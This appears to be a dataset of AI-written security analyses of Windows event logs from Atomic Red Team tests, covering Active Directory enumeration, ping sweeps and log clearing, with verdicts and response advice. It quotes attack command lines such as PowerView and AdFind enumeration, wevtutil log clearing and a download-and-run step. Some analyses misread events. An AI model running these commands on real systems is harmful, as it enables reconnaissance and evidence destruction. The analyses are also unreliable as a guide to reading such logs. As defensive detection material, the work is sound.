   - Execution of PowerShell (`C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`) by a user with high integrity (`admin_test`) is documented without clear, benign context. This could indicate misuse, especially when coupled with the use of `wevtutil.exe`.
   - Execution of `cmd.exe` leading to compilation and execution of a `.cs` (C#) source file with `csc.exe`, creating and running an executable (`T1010.exe`) in the TEMP directory. This behavior is characteristic of certain stages of payload delivery or further code execution, potentially pointing towards a tactic used in controlled evasive operations.

3. **Activity Linked to Execution of Unsigned or Custom Executables**
   - Executing `T1010.exe` from a temporary directory highlights the risk of running potentially malicious files, especially considering its parent processes involved command-line compilation and execution, which could be linked to adversarial testing frameworks or similar.

4. **Failed Credential Access Attempt (Event 5379)**
   - Multiple failed credential read events have been logged (Event ID: 5379) related to different Windows Live and Microsoft Accounts. While this could be benign or typical in some scenarios, combined with log-clearing activities, this could indicate unauthorized attempts to access account information.

### Conclusion:
Although the logs contain instances of seemingly benign operations like updates and system tasks, these are overshadowed by the more serious indicators of clearing logs, suspicious command execution, and credential access attempts. The combination of `admin_test` user actions—particularly clearing multiple logs without corresponding legitimate maintenance or administrative task indicators—aligns with actions typically used to obscure malicious activity.

### Resolution: MALICIOUS
Based on the analysis of these logs, it is concluded that they contain signs of malicious activity. The execution patterns and log-clearing evidence point towards an attempt to hide actions, which warrants immediate attention.

### Next Steps and Recommendations:
- **Immediate Incident Response:** Engage the incident response team to investigate the full scope of the potential breach, including a forensics analysis of `Server002`.
- **User Account Review:** Audit and, if necessary, disable the `admin_test` account or switch to a stricter privileged access management setup.
- **Log Monitoring Enhancements:** Implement tighter log monitoring and alerting on events like log clearance, unexpected command-line executions, and failed access attempts.
- **Endpoint Protection:** Ensure that the latest security updates and endpoint protection measures are in place.
- **Security Awareness:** Conduct a review and reinforcement session for administrative users regarding safe operational practices and indicator recognition. 

These steps should help in clarifying the extent of the compromise and in reinforcing defenses against further unauthorized activities.
"
Powershell enumerate domains and forests,"Upon reviewing the provided logs, several indicators suggest possible malicious activities. Here are the key observations:

1. **Event Log Clearing:** The logs reveal that event logs were cleared multiple times in rapid succession. This includes the Security, System, and Windows PowerShell logs, which is a significant indicator of potential malicious behavior. Clearing logs is often a tactic used by attackers to cover their tracks. Specific entries of concern are:
    - Security Log: EventID 1102 (Log cleared by user `admin_test`).
    - System Log: EventID 104, clearing entries for the System and Windows PowerShell channels.

2. **Suspicious PowerShell Activity:** There are events indicating the use of PowerView, a PowerShell tool used for network recon and privilege escalation activities. The command line used involves importing a module from `AtomicRedTeam`, known for adversarial simulation:
    - Powershell Command:
      ```
      powershell.exe & {Import-Module ""C:\Users\ADMIN_~1\AppData\Local\Temp\AtomicRedTeam\..\ExternalPayloads\PowerView.ps1"", Get-NetDomainTrust, Get-NetForestTrust, Get-ADDomain, Get-ADGroupMember Administrators -Recursive, ([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()).GetAllTrustRelationships()}
      ```

3. **Rapid Execution of Specific Processes**:
    - The logs show rapid execution and log clearing with events involving `wevtutil.exe` for clearing logs (`cl` operation in the command line), which is unusual and could signify tampering or an attempt to obscure activities:
        - Usage of `wevtutil.exe` multiple times corresponds with deletions within event logs, particularly by user `admin_test` through high integrity levels.

4. **Unusual Logon and Privilege Use**:
    - The logs indicate unusual logon patterns and elevated privileges by SYSTEM processes that corresponded in time with the suspicious log activities.
    - Event 4672 logs show the assignment of a broad set of privileges, including `SeTakeOwnershipPrivilege` and `SeDebugPrivilege`, which could facilitate privilege escalation.

5. **Presence of Atomic Red Team Tools**:
    - The entry of tools associated with `AtomicRedTeam` signals red teaming or potential simulation of attack behavior, often utilized for testing but can also be indicative of malicious behavior if not sanctioned. Given the context of cleared logs and PowerView activity with high privileges, it's less likely this is benign.

6. **No Legitimate Justification or Context**:
    - There are no explicit mentions or notes indicating that this activity was part of scheduled testing or updates, which raises suspicions further.

**Assessment**: The combination of event log clearance, use of `AtomicRedTeam` tools like PowerView without any indication of it being planned testing, and the privilege escalation patterns indicate malicious activity or a serious policy breach unless explicitly clarified and authorized by IT governance.

**Resolution**: MALICIOUS – These logs contain definitive signs of potentially unauthorized and malicious activity that aligns with known hostile behavior patterns. Immediate further investigation and containment steps are recommended: 
- Isolate the affected system to prevent further possible spread or data loss.
- Conduct a detailed forensic investigation.
- Review access logs and connections for unauthorized access.
- Inform relevant stakeholders and consider incident response escalation."
Adfind - Enumerate Active Directory Subnet Objects,"Upon reviewing the provided Windows event logs, several key points can be highlighted regarding the system activity:

### Analysis

1. **Log Clearing Events:**
   - The `Security` log contains Event ID `1102`, indicating the security log was cleared by the user `admin_test` (SID: S-1-5-21-3962163828-2803415714-1403596700-1006).
   - The `System` log contains Event ID `104`, indicating the `System` and `Windows PowerShell` logs were also cleared by the same user.

2. **Activities involving `admin_test`:**
   - There are multiple Sysmon Event ID `1` and `5` entries showing processes executed by the user `SERVER002\admin_test`, such as `powershell.exe`, `cmd.exe`, `conhost.exe`, and `wevtutil.exe`.
   - Notably, `wevtutil` was used with the `cl` (clear) command, indicating an attempt to clear specific event log channels on logs related to activities such as `Microsoft-Windows-Sysmon/Operational` and `Application.

3. **Command-line Execution:**
   - There is a suspicious command line used by `cmd.exe` involving `AdFind.exe` in a temporary directory, which may indicate an attempt to perform directory reconnaissance typically associated with penetration testing or malicious activities.

4. **Privileged Logon Sessions:**
   - The `Security` log includes multiple Event ID `4624` (logon success) and `4672` (special privileges assigned) entries involving the `SYSTEM` account with elevated privileges, possibly routine on a server but noteworthy if not expected during the time period.

5. **Background System Processes:**
   - There are processes related to Windows Update and Microsoft Edge updating, which seem normal for a system maintenance window.

### Assessment

- **Log Clearing by `admin_test`:** Log clearing without documented or authorized maintenance activities is a significant indicator of potential malicious activity. It generally signals an attempt to cover tracks after unauthorized activity.
- **Use of `AdFind.exe`:** Execution of tools commonly associated with post-exploitation activities, if not part of a known security test, raises suspicions.
- **Wevtutil Usage:** The explicit use of `wevtutil` to clear logs suggests an attempt at cleaning up traces, which further substantiates the case for potential malicious intent.

### Resolution

Given the indications of log clearing (which can be an attempt to cover tracks), use of potentially malicious tools, and activities performed by a potentially compromised admin account, the overall assessment of these logs would be:

- **MALICIOUS**

### Guidance

1. **Immediate Actions:**
   - Initiate a security incident response to contain and investigate any unauthorized access.
   - Check `admin_test` account usage and credentials for any unauthorized changes or use.
   - Analyze recent system or domain changes correlated with these activities.
   - Review other endpoint security alerts or logs for corroborating evidence.

2. **Preventive Measures:**
   - Revoke and reset credentials for `admin_test` and possibly related accounts.
   - Ensure logging configurations are appropriate and logs are securely forwarded to a SIEM.
   - Review and limit user permissions and access to sensitive tools.

3. **Further Investigation:**
   - Conduct a forensic analysis to determine the full scope of potential compromise.
   - Cross-reference this event timeline with network logs and other available telemetry. 

It is crucial to begin incident response procedures as soon as possible to ensure the integrity and security of the system environment."
Wmic Group Discovery,"Based on the analysis of the event logs provided, several activities raise red flags suggesting potential malicious activity:

1. **Log Clearing Events**: 
   - Security Event Log (`EventID: 1102`): The security log was cleared by the user `admin_test`. Clearing security logs is a common technique used by attackers to cover their tracks and hide evidence of malicious activity.
   - System Event Log (`EventID: 104`): The system log and the Windows PowerShell logs were also cleared by the same user. This is indicative of someone trying to erase their actions, which could be associated with malicious intentions.

2. **Frequent Execution of `wevtutil.exe`**: 
   - `wevtutil.exe` is used multiple times with the command-line arguments to clear event logs (`cl`). Each log channel being cleared (Sysmon, Operational, Security, etc.) was done in rapid succession, which aligns with an attempt to cover tracks on a compromised system.

3. **Use of `cmd.exe` and `wmic.exe` with Suspicious Commands**:
   - `wmic group get name` is executed through `cmd.exe`. This may not be immediately malicious but, given the context (following log clearing activities), it could be part of a reconnaissance effort to gather system information, particularly if paired with other suspicious activities.

4. **Time Change Events**:
   - There are multiple time change events (`EventID: 4616`) in the security log handled by `svchost.exe`. Although time changes can occur during regular operations such as synchronization, frequent unscheduled time changes around suspicious events could indicate attempts to manipulate time to evade detection.

5. **Process Execution**:
   - System processes like `conhost.exe`, `whoami.exe`, and `hostname.exe` are frequently executed but these could be regular background operations executed by scripts or automatically driven processes on a server. However, in conjunction with log clearing, they may merit further investigation to determine their initiation context.

Considering these logs holistically, the activities indicate potential malicious behavior, specifically attempts to cover tracks by clearing event logs and executing potentially unwanted commands. 

Resolution: **MALICIOUS**

**Guidance on How to Proceed:**
- Conduct a thorough investigation of the user account `admin_test` and its activities during the specified timeframe.
- Perform a forensic analysis of the system image to recover cleared logs, if possible, and identify any additional evidence of malicious activity.
- Check for any unauthorized access or anomaly in privileges associated with `admin_test` or any other accounts.
- Utilize network logs to analyze any potential outbound connections that could indicate data exfiltration or communication with a command-and-control (C2) server.
- Remedy the identified vulnerabilities, update access controls, and consider implementing real-time monitoring for future security incidents."
Remote System Discovery - ping sweep,"Upon analyzing the provided Windows event logs, several items stand out that need further investigation:

**1. Log Clearing Events:** The logs contain multiple entries indicating that log files for the System, Application, and Windows PowerShell channels were cleared by the user ""admin_test."" Specifically, these actions are logged around `2024-10-21 09:26:15`. The clearing of logs by a user can be suspicious, especially when combined with other potentially malicious activities, as it may indicate an attempt to cover tracks.

**2. Use of `wevtutil`:** There are several entries in the Sysmon logs indicating the use of the `wevtutil.exe` to clear logs. This usage is often associated with malicious activity intended to hide actions taken on a system.

**3. PowerShell Activity:** There is a sequence of PowerShell events where PowerShell commands are run with restricted execution policies. However, the second set of PowerShell commands involving `Get-Item` and `Get-Content` against ""*.inf"" files is mildly suspicious because it iterates over files looking for specific markers. This type of activity could potentially be part of an enumeration process typically seen in a reconnaissance phase of an attack.

**4. Extensive Pinging Activity:** In the Sysmon logs, there's an extensive set of network activities logged, involving thousands of `ping` commands sent to addresses ranging from `192.168.1.1` to `192.168.1.254`. Launching such a wide array of ping commands appears to be a network scanning activity, which can be indicative of network reconnaissance typically associated with malicious intent.

**5. Administrative Privileges Gained:** The `Security` log indicates the user `admin_test` obtaining elevated privileges (Event ID `4672`) which included typically sensitive privileges like `SeDebugPrivilege`, `SeSecurityPrivilege`, `SeTakeOwnershipPrivilege`, and others. This level of privilege can facilitate a variety of malicious activities.

**6. Credential Failure Attempts:** There are a significant number of Event ID `5379` entries in the Security log indicating failed credential accesses. While the exact cause of these failures isn't explicitly detailed in these logs, numerous failed attempts can indicate unauthorized attempts to access secure accounts.

Given these observations, the logs exhibit some suspicious activities that warrant further investigation:

- The log clearing by `admin_test` along with the repeated use of `wevtutil.exe` to clear logs needs immediate attention. It might be worthwhile to investigate the user's activities during this timeframe and ascertain if they performed any unauthorized actions.
- The PowerShell scripts execution might need to be reviewed further to determine if legitimate administrative tasks required those scripts, or if they align with known malicious activities.
- The ping-sweeping of a large range of IPs needs to be validated for legitimacy, potentially checking if these operations were part of any scheduled network admin tasks or scans.
- Confirm whether `admin_test` and any network-based activities align closely with known patterns of unauthorized intrusion or are legitimate administrative operations.

**Resolution Proposal: SUSPICIOUS**

The collective behavior in these logs suggests suspicious activity that should be thoroughly investigated to determine if there is an ongoing or previous compromise. Investigation actions should include validating the purpose of `admin_test` actions, considering the potential for compromised credentials, and reviewing additional host logs or network logs to correlate activities."
Windows Internal pktmon set filter,"Upon reviewing the provided Windows event logs, several activities stand out that require careful examination to determine the presence of any malicious activity.

1. **Log Clearing Activities:**
   - **Security Event Log Clearing**: An event with EventID 1102 indicates that the Security event log was cleared by the user `SERVER002\admin_test`. This is generally considered suspicious behavior as clearing logs can be a method to cover malicious activity tracks.
   - **System and PowerShell Log Clearing**: Events with EventID 104 indicate that both the System and Windows PowerShell event logs were cleared, again by the user `SERVER002\admin_test`.

2. **Frequent Use of `wevtutil.exe`:**
   - The process `wevtutil.exe`, which manages event logs, was executed multiple times with the `cl` (clear logs) argument for different channels such as Application, System, Security, and Windows PowerShell. This corroborates the suspicion of deliberate log clearing activity.

3. **Abnormal Use of Tools and Commands:**
   - The execution of `cmd.exe` with a command involving `pktmon.exe` could potentially point towards network packet monitoring attempts, although this needs more context to ascertain whether it is part of legitimate administrative activity or something more concerning.

4. **Time Synchronization Adjustments:**
   - There are events related to time changes (EventID 4616) recorded in the logs, executed by the `svchost.exe`. While time synchronization adjustments do occur naturally, these should be analyzed to ensure they are not related to covering the log-clearing time tampering.

Overall, the combination of log clearing actions, repeated use of `wevtutil.exe` to clear specific logs, and potential network activity monitoring with `cmd.exe` and `pktmon.exe` collectively suggest potentially malicious activity. Given these observations, the activity cannot be dismissed as benign, and more detailed investigation is needed to determine the intention and context of these actions.

**Resolution: SUSPICIOUS**

### Guidance on How to Proceed:
1. **Isolate the Host**: To prevent potential further compromise, isolate the host from the network.
2. **Forensic Analysis**: Conduct a comprehensive forensic analysis to gather more evidence of what may have transpired. This should include file system analysis for artifacts left by malicious actors.
3. **Review Access and User Activity**: Investigate user account `admin_test` activities to determine if the account has been compromised or misused.
4. **Check for External Indicators**: Look for any external connections or data exfiltration attempts around the time of these logged events.
5. **Monitor Network Traffic**: Use network monitoring tools to watch for unusual or unauthorized communications with external IPs.

By following these steps, further clarity can be added to the activities carried out on the host, and appropriate security measures can be implemented to mitigate any potential threats."
Discover System Language with dism.exe,"Upon analyzing the provided Windows event logs, several activities and events standout due to their potential for indicating malicious behavior. Here is a detailed breakdown:

1. **Log Clearing Events**: 
   - System, PowerShell, and Security logs were cleared by the same user ""admin_test"" in quick succession (`EventID 104` in System logs, `EventID 1102` in Security logs). This is considered suspicious as log clearance is often an attempt to cover tracks following unauthorized actions.

2. **Time Change Events**:
   - The system time was altered (`EventID 4616` and `EventID 1`) by the LOCAL SERVICE account. Although time changes can happen for legitimate reasons (e.g., time synchronization), when coupled with log clearance, it could be indicative of malicious activity trying to evade detection mechanisms that depend on timestamped logs.

3. **High-Privilege Process Execution**:
   - The user `admin_test` with elevated privileges (`EventID 4672`) executed several unusual processes such as `wevtutil.exe` with the command to clear logs and other utilities possibly used for reconnaissance like `hostname.exe` and `whoami.exe`.

4. **Command-Line Execution**:
   - There are notable command-line activities involving `cmd.exe` executing `dism.exe`. While legitimate, such actions should be cross-examined with user actions to ensure they were authorized.

5. **Sysmon Events**:
   - Numerous Sysmon events show the frequent execution of processes related to `wevtutil.exe` and `conhost.exe`. While this might align with commands to manipulate logs and system configurations, it is critical to assess if this aligns with expected behavior from `admin_test`.

6. **Microsoft Edge Update Processes**:
   - Repeated execution of Edge Update processes could be benign if these are part of a scheduled update process. However, the context should be confirmed, especially if this aligns with the user's typical behavior or scheduled system tasks.

**Assessment**:
- The combination of log clearance, time alteration, and administrative tools being executed with high privileges indicates suspicious activities. While each action could potentially be benign in isolation, together, they suggest actions that commonly align with malicious behavior aiming to remain undetected.

**Resolution**: **SUSPICIOUS** - The logs reflect a series of activities that do not appear routine and should be further investigated. 

**Guidance on How to Proceed**:
- Verify the identity and actions of `admin_test` on the server around the time these logs were generated.
- Determine if there was a legitimate need or scheduled task for log clearance and time adjustments.
- Conduct a further review of other related system and security controls, such as antivirus logs, IDS alarms, and network traffic, to look for corroborating evidence of intrusion or misuse.
- If needed, back up these logs for deeper forensic analysis and consider re-enabling more stringent logging and monitoring on Server002."
Adfind - Enumerate Active Directory Admins,"Upon reviewing the provided Windows event logs, several observations can be made that are crucial in assessing the presence of any suspicious or malicious activity.

### Detailed Analysis:

1. **Numerous Instances of ""wevtutil.exe"":**
   - There are multiple events related to the execution of `wevtutil.exe` with the `cl` (clear) command targeting different Windows event log channels (e.g., Sysmon, Application, System, Security, etc.). This operation is typically suspicious as it suggests an attempt to clear logs, potentially to hide evidence of malicious activity.
   - **Sysmon EventIDs:** `18007`, `18011`, `18015`, `18019`
   - **System Log EventID:** `104` (Log file cleared by `admin_test`)
   - **Security Log EventID:** `1102`

2. **Suspicious Processes:**
   - The `powershell.exe` instance identified in EventID `17993` was executed by the user `SERVER002\\admin_test`. It appears without additional command-line arguments in the provided data, which can suggest that it might be running scripts or commands that are not visible within the current log scope. Moreover, the presence alongside the other actions (like clearing logs) raises suspicion.
   
3. **Use of ""cmd.exe"" with a Suspicious Command:**
   - EventID `18023` shows `cmd.exe` being used to execute a command via an application located in the Temp directory. It includes `AdFind.exe`, a tool often associated with Active Directory enumeration, which can be benign but is frequently used in lateral movement and data gathering by attackers. The association with the clearing of logs makes this activity more suspicious.

4. **Logon Information:**
   - The `Security` log shows a system-level logon activity (`EventID 4624` and `EventID 4672`) which seems consistent with other system-managed operations but considering the context with the log clearing events, further scrutiny is advised.

### Assessment:

The combination of clearing multiple Windows event logs, executing system commands, and using `AdFind.exe` to query host information is a substantial indicator of potentially malicious activity. These actions are indicative of an attempt to cover tracks post-compromise or during malicious reconnaissance activities.

### Conclusion:

**Resolution: MALICIOUS**

- The observed behavior precisely aligns with patterns often observed in post-compromise scenarios where attackers attempt to obfuscate their activities by clearing logs systemically and gather sensitive information from the environment.
- Immediate actions are recommended, including isolating the affected system for further forensic analysis, reviewing access privileges of the user `admin_test`, and ensuring adherence to incident response protocols.

### Guidance:

1. **Isolation and Containment:**
   - Isolate Server002 from the network to prevent further potential activity.

2. **Detailed Forensic Analysis:**
   - Perform a comprehensive analysis of the system's disk and memory to identify further signs of compromise or additional malicious artifacts.

3. **Review and Rectify Access Controls:**
   - Examine and possibly revoke `admin_test` user privileges and investigate any anomalous behavior associated with this account.

4. **Log and Monitor:**
   - Implement robust logging and monitoring to detect similar activities in the future.
   - Ensure centralized log retention where logs can't be easily deleted locally.

5. **Enhance Security Measures:**
   - Consider deploying more rigorous endpoint detection and response (EDR) tools.

Given these findings, swift and decisive actions are essential to mitigate any potential compromise and to safeguard against future threats."
Remote System Discovery - adidnsdump,"**Detailed Analysis of the Logs:**

1. **Log Clearing Events:**
   - **Sysmon Logs**: We observe several `wevtutil.exe` executions aimed at clearing logs (`""wevtutil.exe"" cl Microsoft-Windows-Sysmon/Operational`). This is notable because `wevtutil` is a legitimate utility used to manage event logs and a known tool for attackers to delete logs to cover their tracks.
   - **System Logs**: Event ID 104 logs are associated with ""Log file cleared"" for the `System` and `Windows PowerShell` logs by the user `admin_test`.
   - **Security Logs**: Event ID 1102 (Log cleared) is registered, indicating security log clearing. This particular log clearing is a major red flag, typically indicating an attempt to hide malicious activities.

2. **Suspicious Command Execution:**
   - `cmd.exe` script involving `adidnsdump` execution is observed which can be used for DNS reconnaissance or exfiltration activities. It includes a PowerShell command to run external payloads, which implies a possibility of unwanted data access or manipulation.

3. **Unusual PowerShell Activity:**
   - The PowerShell script includes downloading and executing a Python installer, which is atypical for standard operations and might suggest launching a secondary payload or persistence mechanism. The usage of `Invoke-WebRequest` followed by `Start-Process` for an executable installation is a common technique used in malicious scripts.

4. **Python and Installer Activity:**
   - There are multiple entries indicating Python installations, including a setup with specific arguments. While Python can have legitimate uses, its installation accompanied by log clearing and PowerShell download commands points towards a possible attempt to execute a payload or set up an environment for executing malicious scripts.

5. **Privilege Escalation:**
   - Event ID 4672 indicates the assignment of special privileges to SYSTEM accounts. While this is part of normal operations for SYSTEM users, the confluence of this with log clearing and suspicious script/command activities increases concern.

**Assessment of the Situation:**

The observed behavior, particularly the log clearing, unusual command executions, suspicious PowerShell activity, and potential for credential and data exfiltration through DNS, together suggest a coordinated attempt to either breach or escalate compromise on the system. The use of tools and scripting indicative of penetration testing or red-team activities (e.g., Atomic Red Team) without formal approval can be considered malicious in an operational environment.

**Identified Risks and Guidance:**

- **Risk:** There is a significant risk of data breach or further intrusion due to the scripts' potential capabilities and their execution context.
- **Risk Mitigation:** 
  - Immediate containment and investigation into the user account `admin_test` to prevent further log clearing or potential lateral movement.
  - Perform forensic analysis on the machine to uncover additional artifacts not logged or covered up.
  - Assess network traffic for any unauthorized data exfiltration and isolate any connected suspicious endpoints. 

**Resolution:**

- **MALICIOUS** - The collected logs entail malicious activities, indicating potential compromise or an active threat requiring immediate investigation.

**Recommended Actions:**

- **Quarantine the affected host**: Isolate to prevent spread or further malicious activity.
- **User Account Management**: Re-evaluate permissions and monitor the account `admin_test`. Reset passwords and ensure MFA is enabled.
- **Audit and Enhance Security Monitoring**: Increase logging, incorporate intrusion detection capabilities, and review security policies.
- **Incident Response Activation**: Deploy your incident response team or a third-party to perform a complete investigation and system clean-up.
- **Communication with Stakeholders**: Notify relevant internal teams and possibly external partners or security operations centers to alert against potential widespread activity."
List Windows Firewall Rules,"Upon analyzing the provided Windows event logs, I identified the following aspects that may be considered suspicious or indicative of anomalous behavior:

1. **Wevtutil Log Clearing**: Multiple uses of `wevtutil.exe` to clear event logs, specifically for the System, Application, and Windows PowerShell logs, were observed. This action is typically suspicious because clearing event logs can be an attempt to hide malicious activity. The involved process had high integrity level and was executed under the user `SERVER002\admin_test`.

2. **Use of Command-line Utilities**:
   - `cmd.exe` was used to execute `netsh advfirewall firewall show rule name=all`. This command lists all firewall rules and, while not inherently malicious, access to it via a script or by an unauthorized user could suggest reconnaissance activity.
   - `whoami.exe` and `hostname.exe` were executed, which display user and system information. These commands, in conjunction with log clearing, might indicate information gathering for malicious purposes.

3. **Log Clearing Event**: The System log contained event ID 104, which indicates that the System log was cleared by the user `admin_test` at the same time `wevtutil.exe` was executed.

4. **General Log Activity**: The sequence and rapid execution of event logs and the clearing of multiple logs in a very short timeframe may indicate automated or scripted behavior.

### Assessment

Based on the analysis, the logs demonstrate activity that deviates from normal operational behavior, specifically the clearing of logs and the usage of command-line utilities for potential reconnaissance. These behaviors often align with indicators seen in post-compromise activity. Therefore, this warrants further investigation to ensure these actions are legitimate and identified as such either by user intent or a benign script.

### Resolution

- **SUSPICIOUS**: The logs contain suspicious activity that requires further investigation. While the use of wevtutil, cmd, and other utilities could be legitimate within certain contexts, the clearing of logs suggests potential malicious intent that should be investigated. 

### Guidance on How to Proceed

1. **Verify with User**: Confirm with the user `admin_test` if these actions were legitimate and authorized. Determine if any scripts were intended to perform such actions.

2. **Conduct a Full Investigation**: Perform a detailed forensic examination of the host `Server002` focusing on:
   - Full process tree analysis around the time of the event log clearing.
   - Check for any unauthorized access or new scripts/applications installed.
   - Network logs for unusual remote connections during the timeframe of suspicious activities.

3. **Enhance Logging and Monitoring**: Ensure that logging policies are set to alert on similar activities and that they are retained for a suitable duration to avoid tampering.

Ensuring that these activities were either part of an administrative task or unauthorized is crucial in protecting against potential security breaches."
Win32_PnPEntity Hardware Inventory,"After analyzing the logs provided, there are several points of interest which may indicate suspicious activity:

1. **Clearing of Event Logs:** 
   - There are several instances in system and security logs where logs are cleared (`EventID 104` in System log and `EventID 1102` in Security log). This can be a strong indicator of malicious activity, as attackers sometimes clear the logs to cover their tracks after conducting operations on a host.

2. **Usage of `wevtutil.exe`:** 
   - The `wvteutil.exe` process, which is responsible for managing event logs, appears multiple times with the command-line operations such as `wevtutil.exe` followed by `cl` commands indicating potential clearing of specific logs. This includes channels like “Microsoft-Windows-Sysmon/Operational”, “Application”, and “System”, which matches the System EventID 104 entries.

3. **PowerShell Activity:**
   - Multiple PowerShell events are initiated with a script seemingly collecting hardware details using `Get-WMIObject`. This can be seen in the PowerShell log entries and the `Sysmon` log events for `PowerShell`. The command-line indicates data collection, which while not necessarily malicious, combined with log clearing could be indicative of reconnaissance activity.

4. **Integrity Level & Elevated Privileges:**
   - Events operated by user `SERVER002\admin_test` have an integrity level set to ""High,"" suggesting that the actions being taken had elevated privileges.

5. **Frequent use of system-critical applications:**
   - Applications like `conhost.exe`, `whoami.exe`, and `HOSTNAME.EXE` appear frequently with `admin_test` as the user. While it's normal to see these processes in some logs, the frequency and timing closely associated with the `wevtutil.exe` during a short time span can raise concerns for scripting or unauthorized root access.

6. **Execution of Potential Reconnaissance Commands:**
   - Usage of `whoami.exe` and `HOSTNAME.EXE` can be part of an attacker’s preliminary reconnaissance to understand system permissions and configurations.

**Conclusion:**
The combination of log clearing, high integrity PowerShell activity executing data collection scripts, high-frequency use of `wevtutil.exe` for log management and evidence of potentially suspicious elevated command executions (such as `whoami.exe` and `HOSTNAME.EXE`) collectively indicate suspicious behavior.

**Resolution:**
- **SUSPICIOUS**: The behavior observed in the logs suggests activities that deviate from normal operations and require further investigation to confirm malicious intent. Additional review of associated user activities, network traffic analysis, and a check for known vulnerabilities on `Server002` is recommended to fully vet this behavior. Ensure access and usage policies for elevated actions like log management and PowerShell execution are reviewed and potentially restricted."
operating system discovery,"Upon reviewing the logs provided, several entries indicate potentially suspicious activities that warrant further investigation:

1. **Log Clearing Events:**
   - System and PowerShell logs have been cleared at the same time by the user ""admin_test."" The use of `wevtutil.exe cl` commands followed by logs being cleared is suspicious. Such actions are often taken by malicious actors attempting to hide their tracks following an intrusion or compromise.
   - Event ID 1102 in the Security log indicates that the Security log was also cleared by ""admin_test"" from the same session. Clearing Security logs is a critical action that should always prompt further scrutiny.

2. **Sysmon Activity:**
   - Multiple executions of `wevtutil.exe` across different logs represent an anomalous behavior pattern. This utility is used to manage Windows event logs and is rarely used except for administrative purposes.
   - The user ""admin_test"" executing these commands with high integrity levels is a further red flag. The high integrity level indicates elevated permissions, which should be used cautiously and monitored closely.

3. **PowerShell Usage:**
   - The PowerShell logs show usage of `Get-CimInstance` to gather system information, which is not inherently malicious but could be part of reconnaissance activities.
   - The PowerShell engine started without additional script execution context is benign, but in conjunction with other suspicious events, it demands further examination.

4. **Time Change Events:**
   - Kernel-General logs indicate changes to the system time around the same period other suspicious events occurred. Changing system time might be linked with attempts to manipulate timestamp-based defenses or logs.

These log entries collectively form a pattern often associated with malicious activity. The simultaneous clearing of logs by a user with elevated privileges, combined with the use of event utility tools, is a strong indicator that an attempt was made to cover unauthorized or malicious actions.

### Assessment:
- **Resolution: MALICIOUS**

### Guidance:
1. **Immediate Actions:**
   - Isolate the affected system (Server002) from the network to prevent any further activity by a potential attacker.
   - Conduct a full forensic analysis on the system to determine the extent of the compromise, including a memory dump and further investigation of disk usage.
   - Change all credentials and keys that might have been accessed or used from this host.

2. **Review and Strengthen Security Policies:**
   - Audit privilege level and access management to ensure that elevated privileges are granted only when necessary and are closely monitored.
   - Implement stricter logging policies and alert systems for actions such as log-clearing events or administrative tool usage.

3. **All-Hands Review:**
   - Have a cross-departmental meeting to reinforce security protocols and awareness, ensuring all teams understand the signs of potential insider threats or compromises.

Given these observations, it is crucial to act swiftly to mitigate further risks and protect your network."
Adfind - Enumerate Active Directory Trusts,"### Detailed Analysis of the Windows Event Logs

#### Suspicious or Anomalous Behavior

1. **Log Clearing Events:**
   - **Security Log Clear:** Event ID 1102 indicates that the security event log was cleared by user `admin_test` with Logon ID `0x139209`. The process responsible (as indicated by `ClientProcessId` 6844) matches a ""wevtutil.exe"" command which is often used to clear logs.
   - **System Log Clear:** Multiple instances of Event ID 104 indicate that the system log was cleared by `admin_test`. The `ClientProcessId` values (4148 and 6856) indicate the use of ""wevtutil.exe"" as well.
   
2. **Command Execution with Potential Malicious Intent:**
   - **Usage of AdFind Tool:** A command-line seen in the events is `""cmd.exe"" /c ""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\AtomicRedTeam\\..\\ExternalPayloads\\AdFind.exe"" -gcb -sc trustdmp`. This is indicative of a known tool often used in Active Directory recon operations and could signal enumeration activities after a compromise.

3. **Frequent Use of `wevtutil.exe`:**
   - There are multiple `wevtutil.exe` process creations seen, which correlate with the clearing of various event logs. This level of log clearing activity is unusual and suggests an attempt to cover tracks.

4. **PowerShell and `conhost.exe` Activity:**
   - The presence of PowerShell execution (`powershell.exe`) in conjunction with `conhost.exe` right after could suggest the execution of a script or command line tasks, which weren't explicitly logged here.

5. **Service Stopping Logs from `MicrosoftEdgeUpdate`:**
   - This is the only benign pattern here as frequent service manipulation by `MicrosoftEdgeUpdate.exe` is typical of automated updates.

#### Indicators of Compromise (IOC)

- **Logon with Special Privileges (Event ID 4672):** Systems processes using elevated privileges, although common, could be examined in conjunction with other suspicious activities to confirm malicious intent.
- **Process Execution:** Execution of external binaries from temporary directories under context of an administrative user.

### Threats or Risks Identified

- Potential Data Exfiltration or Reconnaissance: Usage of `AdFind.exe` suggests the possibility of data reconnaissance within an Active Directory environment.
- Log Tampering: Cooperative events of wevtutil.exe usage and log clearance point towards attempts to hide unauthorized actions.

### Guidance & Resolution

Given the identified anomalies related to log clearing, use of recon tools, and suspicious execution patterns, the situation should be classified with caution.

**Final Assessment:** SUSPICIOUS

**Guidance for Further Actions:**

- **Investigate User `admin_test` Activities:** Review account behaviors and access during the incident window.
- **Examine Event Log Backups:** If available, examine backups of logs before clearance to find anomalous activities.
- **Audit Use of `AdFind.exe`:** Determine how and why AdFind and other tools are present and if this usage aligns with regular administrative tasks.
- **Check for Persistence Mechanisms:** Further probe into PowerShell and temporary directories for potential persistence mechanisms and unauthorized scripts.
- **Network Traffic Analysis:** Enlist network logs to see any data exfiltration or unusual external connections.
  
### Recommendations

- Ensure all logs are backed up and monitored effectively to prevent easy tampering.
- Inflows from external directories, especially running as an admin, should be particularly well monitored for unauthorized executions.
- Strengthen user activity auditing and endpoint detection response measures to detect and prevent future occurrences of similar suspicious activities."
Remote System Discovery - nltest,"Upon reviewing the provided Windows event logs, several items indicate potentially suspicious activities:

1. **Event Log Clearing**: 
   - In the Security log, Event ID 1102 indicates that the event log was cleared by the user ""admin_test"". This is a significant red flag as it could indicate an attempt to cover up malicious activities. Clearing logs is commonly associated with attackers trying to hide traces of their actions.

```json
{
  ""EventID"": ""1102"",
  ""TimeCreated"": ""2024-10-21 09:22:27.2486365"",
  ""UserName"": ""admin_test""
}
```

2. **Commands Involving Wevtutil**:
   - Multiple instances of `wevtutil.exe` being executed, observed in Sysmon logs. The use of the `cl` (clear) command on different channels such as ""Sysmon/Operational"" and ""Application"" suggests an automated scripting action to clear logs across multiple channels.
   - Additionally, `conhost.exe` is repeatedly invoked alongside `wevtutil.exe`, a pattern consistent with script or malware activity that utilizes the console window host.

```json
{
  ""ProcessName"": ""wevtutil.exe"",
